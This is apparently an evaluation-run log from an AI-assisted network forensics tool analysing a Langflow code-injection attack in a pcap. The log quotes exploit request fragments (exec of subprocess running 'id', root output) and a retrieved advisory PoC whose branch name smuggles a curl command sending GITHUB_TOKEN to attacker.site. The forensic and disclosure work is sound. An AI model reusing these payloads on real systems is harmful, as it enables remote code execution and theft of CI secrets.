@@ -1,0 +1,168 @@
+============================================================
+MAFRA MCP - Online Evidence-Enrichment Forensic Analysis
+============================================================
+
+Analysing: incident.pcap
+Anonymous case ID: case_751f74cd62e9ca463ac9
+
+[1/3] Preparing network evidence...
+
+Flow summary saved to: C:\Users\12486\Desktop\FRA_Project_V2_MCP\MAFRA_Eval30\pcaps\TestSet_event7_cve-2025-3248_success_2_mafra_mcp_flow_summary.txt
+[2/3] Running forensic agents and online research...
+Memory Manager: DISABLED (fair evaluation mode)
+
+Investigation findings:
+  Service: Langflow
+  Attack Type: Command Injection
+  Attack Success: Success
+  CVE: CVE-2026-0768
+  Overall Confidence: Medium
+
+Full MAFRA MCP report saved to: C:\Users\12486\Desktop\FRA_Project_V2_MCP\evaluation_outputs\runs\deepseek_r1_0528_30_20261025_202456\reports\TS-07_mafra_report.txt
+MCP evidence audit saved to: C:\Users\12486\Desktop\FRA_Project_V2_MCP\evaluation_outputs\runs\deepseek_r1_0528_30_20261025_202456\reports\TS-07_mafra_report.mcp_evidence.json
+[3/3] Saving investigation results...
+Memory storage skipped: mode=disabled
+Total cases in this isolated collection: 0
+Detailed terminal log saved to: C:\Users\12486\Desktop\FRA_Project_V2_MCP\evaluation_outputs\runs\deepseek_r1_0528_30_20261025_202456\reports\TS-07_mafra_report.terminal.log
+
+============================================================
+FINAL SECURITY REPORT
+============================================================
+Affected Service: Unknown
+Associated CVE candidate (Analyst): CVE-2026-0768
+Associated CVE mechanism match (binary): No
+Exact CVE applicability established: No
+Attack prediction confidence: Medium
+Attack outcome evidence-verified: Yes
+Identified CVE: CVE-2026-0768
+Attack: Successful
+Is Service Vulnerable: Yes
+Evidence:
+- PCAP [E-S0003-F000067-003]: POST /api/v1/validate/code.
+- PCAP [E-S0003-F000069-008]: exec(\"raise Exception(__import__('subprocess').
+- PCAP [E-S0003-F000069-009]: id.
+- PCAP [E-S0003-F000071-010]: HTTP Status 200.
+- PCAP [E-S0003-F000073-013]: uid=0.
+- PCAP [E-S0003-F000073-014]: gid=0.
+- PCAP [E-S0003-F000073-015]: Server response contains uid=0(root) (possible command output; correlate with request).
+- PCAP [E-S0003-F000073-016]: Server response contains gid=0(root) (possible command output; correlate with request).
+- PCAP [E-S0005-F000125-003]: POST /api/v1/validate/code.
+- PCAP [E-S0005-F000127-008]: exec(\"raise Exception(__import__(\\\"subprocess\\\").
+- PCAP [E-S0005-F000129-009]: HTTP Status 200.
+- PCAP [E-S0005-F000131-010]: 172.18.0.2:7860 -> 172.18.0.1:55234 (HTTP/JSON).
+- ONLINE RESEARCH LEAD [NIST NVD] CVE-2026-33475: NVD vulnerability record: Langflow is a tool for building and deploying AI-powered agents and workflows. An unauthenticated remote shell injection vulnerability exists in multiple GitHub Actions workflows in the Langflow repository prior to version 1.9.0. Unsanitized interpolation of GitHub context variables (e.g., `${{ github.head_ref }}`) in `run:` steps allows attackers to inject and execute arbitrary shell commands via a malicious branch name or pull request title. This can lead to secret exfiltration (e.g., `GITHUB_TOKEN`), infrastructure manipulation, or supply chain compromise during CI/CD execution. Version 1.9.0 patches the vulnerability.
+
+---
+
+### Details
+
+Several workflows in `.github/workflows/` and `.github/actions/` reference GitHub context variables directly in `run:` shell commands, such as:
+
+```yaml
+run: |
+  validate_branch_name "${{ github.event.pull_request.head.ref }}"
+```
+
+Or:
+
+```yaml
+run: npx playwright install ${{ inputs.browsers }} --with-deps
+```
+
+Since `github.head_ref`, `github.event.pull_request.title`, and custom `inputs.*` may contain **user-controlled values**, they must be treated as **untrusted input**. Direct interpolation without proper quoting or sanitization leads to shell command injection.
+
+---
+
+### PoC
+
+1. **Fork** the Langflow repository
+2. **Create a new branch** with the name:
+   ```bash
+   injection-test && curl https://attacker.site/exfil?token=$GITHUB_TOKEN
+   ```
+3. **Open a Pull Request** to the main branch from the new branch
+4. GitHub Actions will run the affected workflow (e.g., `deploy-docs-draft.yml`)
+5. The `run:` step containing:
+   ```yaml
+   echo "Branch: ${{ github.head_ref }}"
+   ```
+   Will execute:
+   ```bash
+   echo "Branch: injection-test"
+   curl https://attacker.site/exfil?token=$GITHUB_TOKEN
+   ```
+
+6. The attacker receives the CI secret via the exfil URL.
+
+---
+
+### Impact
+
+- **Type:** Shell Injection / Remote Code Execution in CI
+- **Scope:** Any public Langflow fork with GitHub Actions enabled
+- **Impact:** Full access to CI secrets (e.g., `GITHUB_TOKEN`), possibility to push malicious tags or images, tamper with releases, or leak sensitive infrastructure data
+
+---
+
+### Suggested Fix
+
+Refactor affected workflows to **us Source: https://nvd.nist.gov/vuln/detail/CVE-2026-33475 Supports: NVD lists CVE-2026-33475 as a research lead; product identity, version applicability, and exploitation remain unverified.
+- ONLINE [NIST NVD] CVE-2026-0768: NVD vulnerability record: Langflow code Code Injection Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Langflow. Authentication is not required to exploit this vulnerability.
+
+The specific flaw exists within the handling of the code parameter provided to the validate endpoint. The issue results from the lack of proper validation of a user-supplied string before using it to execute Python code. An attacker can leverage this vulnerability to execute code in the context of root.
+. Was ZDI-CAN-27322. Source: https://nvd.nist.gov/vuln/detail/CVE-2026-0768 Supports: NVD lists CVE-2026-0768 as a research lead; product identity, version applicability, and exploitation remain unverified.
+- ONLINE RESEARCH LEAD [NIST NVD] CVE-2026-51886: NVD vulnerability record: langflow-ai langflow v1.9.3 is affected by: Code Injection. The impact is: execute arbitrary code (remote). The component is: src/backend/base/langflow/api/v1/validate.py:validate-post_validate_code-a-real-authenticated-http-post-to-api-v1. The attack vector is: Attack surface: HTTP or browser-backed service path. A public-facing route accepts raw Python source and forwards it into a server-side compile/exec validation path without any visible entitlement guard. ¶¶ A weakness has been identified in langflow-ai langflow up to 1.9.3. langflow contains a code injection vulnerability in validate-post_validate_code-a-real-authenticated-http-post-to-api-v1 (src/backend/base/langflow/api/v1/validate.py:13). An authenticated attacker can execute arbitrary Python code on the server by submitting malicious code to the /api/v1/validate/code endpoint, which directly executes user-supplied code without sandboxing or security controls. Source: https://nvd.nist.gov/vuln/detail/CVE-2026-51886 Supports: NVD lists CVE-2026-51886 as a research lead; product identity, version applicability, and exploitation remain unverified.
+- ONLINE RESEARCH LEAD [NIST NVD] CVE-2026-9135: NVD vulnerability record: IBM Langflow OSS 1.0.0 through 1.10.0 Langflow versions up to 1.9.2 (commit 94981c443d4918517b9e8163d70fc598dc33a32d) contain a code injection vulnerability in the Policies component's ToolGuard integration that bypasses the allow_custom_components=false security control. The vulnerability exists because the validation mechanism only checks the main component source code in node_template["code"]["value"] but fails to validate dynamic CodeInput fields that store generated ToolGuard Python files. Attackers can embed malicious Python code in these unvalidated dynamic fields, which are persisted in Flow.data and later executed server-side when a guarded tool is invoked through the ToolGuard runtime. This allows authenticated users with flow creation privileges to achieve arbitrary Python code execution on the backend despite custom component restrictions. The vulnerability can be escalated through cross-tenant flow manipulation via the agentic MCP update_flow_component_field tool, which accepts attacker-controlled user_id parameters, enabling attackers to inject malicious code into victim users' flows. When combined with publicly accessible flows and specific misconfigurations (AUTO_LOGIN=true, NEW_USER_IS_ACTIVE=true), the attack can be conducted with reduced authentication requirements. Source: https://nvd.nist.gov/vuln/detail/CVE-2026-9135 Supports: NVD lists CVE-2026-9135 as a research lead; product identity, version applicability, and exploitation remain unverified.
+- ONLINE [Serper web result] Web Application Vulnerabilities | SQLi, XSS & CSRF: UNTRUSTED WEB RESEARCH (not PCAP evidence). Web application vulnerabilities are weaknesses or flaws in web apps that can be exploited by attackers to access sensitive data, manipulate systems, or ... | Webpage text: [PARTIAL WEBPAGE: only first 150000 bytes examined] The Quarterly Threat Landscape Report is out. See what attackers are targeting now.Read report Source: https://www.rapid7.com/fundamentals/web-application-vulnerabilities/
+- ONLINE [Serper web result] Websites taken down worldwide as critical cyber-security ...: UNTRUSTED WEB RESEARCH (not PCAP evidence). The vulnerabilities were found within the PHP programming language, with a fix issued on Wednesday afternoon. | Webpage text: [PARTIAL WEBPAGE: only first 150000 bytes examined] Websites taken down worldwide as critical cyber-security update issued Add as preferred on Google Tom Gerken and Laura Cress,Technology reportersand Joe Tidy,Cyber correspondent, BBC World Service International governments and agencies have urged websites to address two critical cyber-security flaws in a programming language which powers much of the internet. The vulnerabilities were found within the PHP programming language, with a fix issued on Wednesday afternoon. Multiple cyber-security agencies have urged organisations unable to apply fixes in time to consider taking their sites down, leading bodies such as the Finnish government, Edinburgh council and the BBC to take pages offline. The flaws were discovered by AI, with cyber-security firm Wiz saying they were the "most severe vulnerabilities ever discovered" by the tech, which is reshaping the cyber landscape. Finland has temporarily shut down the government's public web services, while the Netherlands' cyber-security agency said it was taking its own website offline due to the vulnerabilities. The US National Security Agency issued similar advice on X for organisations to take their systems offline if they were unable to update with the fix. "These vulnerabilities often provide a direct path to the server's file system or database," it wrote. Meanwhile, the White Hous Source: https://www.bbc.com/news/articles/cmly0lg3w5x2o
+- ONLINE [Serper web result] Vulnerabilities | OWASP Foundation: UNTRUSTED WEB RESEARCH (not PCAP evidence). A vulnerability is a hole or a weakness in the application, which can be a design flaw or an implementation bug, that allows an attacker to cause harm to the ... | Webpage text: A vulnerability is a hole or a weakness in the application, which can be a design flaw or an implementation bug, that allows an attacker to cause harm to the stakeholders of an application. Stakeholders include the application owner, application users, and other entities that rely on Please do not post any actual vulnerabilities in products, services, or web applications. Those disclosure reports should be posted to bugtraq or full-disclosure mailing lists. Examples of vulnerabilities Lack of input validation on user input Lack of sufficient logging mechanism Not closing the database connection properly For a great overview, check out the OWASP Top Ten Project. You can read about the top vulnerabilities and download a paper that covers them in detail. Many organizations and agencies use the Top Ten as a way of creating awareness about application security. NOTE: Before you add a vulnerability, please search and make sure there isn’t an equivalent one already. You may want to consider creating a redirect if the topic is the same. Every vulnerability article has a Allowing Domains or Accounts to Expire Business logic vulnerability CSV Injection by Timo Goosen, Albinowax Catch NullPointerException Deserialization of untrusted data Directory Restriction Error Expression Language Injection Full Trust CLR Verification issue Exploiting Passing Reference Types by Reference Improper pointer subtraction Information exposure through query strings in URL by Robert Gilbert (amroot) Insecure Deserialization by Vaibhav Malik Insecure Compiler Optimization Insecure Third Party Domain Access Insufficient Numeric Precision by Abdullah Al-Khalaf Insufficient Session ID Length by Jake Karnes Least Privilege Violation OWASP .NET Vulnerability Research Overly Permissive Regular Expression PHP Object Injection by Egidio Romano Password Management Hardcoded Password Password Plaintext Storage Poor Logging Practice by Weilin Zhong Race Conditions by Cindy Ramirez Return Inside Finally Block Session Variable Overloading Unchecked Error Condition Unchecked Return Value Missing Check against Null Unsafe function call from a signal handler Use of hard-coded password Using a broken or risky cryptographic algorithm Vulnerability Scanning Tools XML External Entity (XXE) Processing The Follina Vulnerability - A Critical Threat to Microsoft Office by Tholkappiar The OWASP® Foundation works to improve the security of software through its community-led open source software projects, hundreds of chapters worldwide, tens of thousands of members, and by hosting local and global conferences. Important Community Links Vulnerabilities (You are here) Upcoming OWASP Global Events Source: https://community.owasp.org/vulnerabilities/
+- ONLINE [Serper web result] 41 Common Web Application Vulnerabilities Explained: UNTRUSTED WEB RESEARCH (not PCAP evidence). 41 Common Web Application Vulnerabilities Explained · 1. Broken access control · 2. Broken authentication · 3. Carriage Return and Line Feed ( ... | Webpage text: [PARTIAL WEBPAGE: only first 150000 bytes examined] Posted on March 5th, 2021. Organizations continue to “shift left,” embracing the new employee and customer experiences delivered by cloud-based applications. Simultaneously, malicious actors continue to revise their attack methodologies to address this shift. To maintain data security and privacy, organizations need to protect against these 41 common web application vulnerabilities. Access controls define how users interact with data and resources including what they can read or edit. A broken access control vulnerability exists when a user has the ability to interact with data in a way that they don’t need. For example, if a user should only be able to read payment details but can actually edit them, this is a broken access control. Malicious actors use this vulnerability to gain unauthorized a Broken authentication vulnerabilities also focus on user access. However, in this case, malicious actors compromise the information that confirms a user’s identity, such as by stealing passwords, keys, or session tokens. The malicious actor gains unauthorized access to the systems, networks, and software because the company failed to adequately set appropriate identity and access management controls. 3. Carriage Return and Line Feed (CRLF) Injection Carriage return is a command that indicates the start of a line of code, normally denoted as . Line feed is a command that indicates the end of a line of code, normally denoted as . Like many other software, each operating system uses a different combination of carriage return and line feed. When malicious actors engage in CRLF injections, the inserted code changes the way that the web application responds to commands. This can be used to either disclosure sensitive information or execute code. 4. Cipher transformation insecure Cipher, a standard term for “encryption algorithm,” is the math behind an encryption/decryption process. Transformation is the list of operations performed on an input to provide the expected output. So, a cipher transformation is the set of operations that turn unreadable encrypted data back to readable, decrypted data. A cipher transformation insecure vulnerability means that the encryption algorithm is easy to bre 5. Components with known vulnerabilities Every web application relies on other components to work. For example, if you’re running an application on an unpatched web/application server, the server is the component with known vulnerabilities. The Common Vulnerabilities and Exposures (CVE) list includes all known security vulnerabilities. Since malicious actors are aware of the list, they regularly look for components without the appropriate security patch upd 6. Cross-Origin Resource Sharing (CORS) Policy Every web-based application uses a URL as a way to connect the user’s browser to its server. One common protection is called a Same Origin Policy. According to this, the server will only respond to a URL that has the same protocol, top-level domain name, and path schema. This means that you can access http://company.com/page1 and http:/company.com/page2 because they both have the following in common: Although secure, the Same Origin Policy becomes restrict Source: https://securityscorecard.com/blog/common-web-application-vulnerabilities-explained/
+
+Verification Summary:
+- Affected service: Unknown.
+- Attack type: Command Injection.
+- Attack technique: Remote Code Execution.
+- Service supported by Verifier: No.
+- Attack supported by Verifier: Yes.
+- Attack success supported by Verifier: Yes.
+- Verification result: Partially Supported.
+- Verifier confidence: Medium.
+- Consensus confidence: Medium.
+- Consensus score: 3/5.
+- Consensus attack outcome: Success.
+- Validated CVE: CVE-2026-0768.
+- CVE assessment: Analyst proposed CVE-2026-0768; independent Verifier CVE support: Yes. No separate online CVE validator was run.
+- Unsupported claim: Service application identified as Langflow is not directly supported by packet evidence
+- Binary associated-CVE mechanism match: No.
+- Exact CVE applicability established: No.
+- Binary attack prediction: Success (Medium confidence).
+- Attack prediction supported by prior Consensus: Yes.
+- Binary decision limitation: CVE mechanism match is not established; No means not supported, not disproven.
+- Binary decision limitation: Exact affected-version/configuration applicability has not been established; No does not mean patched or safe.
+- MCP evidence search status: Valid.
+- MCP investigation query: web vulnerability packet clues: endpoint validate code.
+- Online results were used as supporting context and did not replace packet evidence or Verifier findings.
+- Evidence-source URL: https://nvd.nist.gov/vuln/detail/CVE-2026-33475
+- Evidence-source URL: https://nvd.nist.gov/vuln/detail/CVE-2026-0768
+- Evidence-source URL: https://nvd.nist.gov/vuln/detail/CVE-2026-51886
+- Evidence-source URL: https://nvd.nist.gov/vuln/detail/CVE-2026-9135
+- Evidence-source URL: https://www.rapid7.com/fundamentals/web-application-vulnerabilities/
+- Evidence-source URL: https://www.bbc.com/news/articles/cmly0lg3w5x2o
+- Evidence-source URL: https://community.owasp.org/vulnerabilities/
+- Evidence-source URL: https://securityscorecard.com/blog/common-web-application-vulnerabilities-explained/
+- Evidence limitation: Online sources are supporting context; packet evidence remains primary.
+- Evidence limitation: The Analyzer and Verifier findings were retained without rewriting.
+- Evidence limitation: Webpage read unavailable for www.cybersecuritydive.com: HTTPError: HTTP Error 403: Forbidden
+- Evidence limitation: 3 online CVE record(s) were retained as product-related research leads only; they were not used as the validated CVE.
+
+Defensive Recommendation:
+- Patch Langflow installations against CVE-2026-0768 vulnerability
+- Implement strict input validation for 'code' parameter in /api/v1/validate/code endpoint
+- Execute application components with least-privileged accounts (non-root)
+- Deploy runtime code execution sandboxing for user-supplied Python code
+- Add authentication requirements to code validation endpoints
+============================================================
+MAFRA MCP analysis complete!
+
+C:\Users\12486\Desktop\FRA_Project_V2_MCP\.venv\Lib\site-packages\langchain_core\_api\deprecation.py:25: UserWarning: Core Pydantic V1 functionality isn't compatible with Python 3.14 or greater.
+  from pydantic.v1.fields import FieldInfo as FieldInfoV1
